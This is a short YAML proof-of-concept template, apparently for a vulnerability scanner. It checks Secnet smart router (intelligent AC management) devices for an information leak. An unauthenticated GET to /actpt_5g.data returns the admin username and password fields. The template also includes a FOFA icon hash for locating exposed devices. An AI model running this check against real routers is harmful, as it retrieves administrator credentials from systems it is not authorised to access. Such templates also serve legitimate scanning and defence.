id: poc-yaml-secnet-actpt-5g-data-info-leak
info:
  name: Secnet-智能路由系统 actpt_5g.data 信息泄露漏洞
  severity: high
  tags:
  - 信息泄露
  finger: 智能AC管理系统
  fofa: icon_hash="706913071"
requests:
- method: GET
  path: /actpt_5g.data
  expression: "status_code == 200 && \ncontains(body,\"\\\"http_username\\\"\") &&\n\
    contains(body,\"\\\"http_passwd\\\"\") &&\ncontains(headers,\"HTTPD_ac\") &&\n\
    !contains(body,\"<\")\n"
variables: {}
transport: http
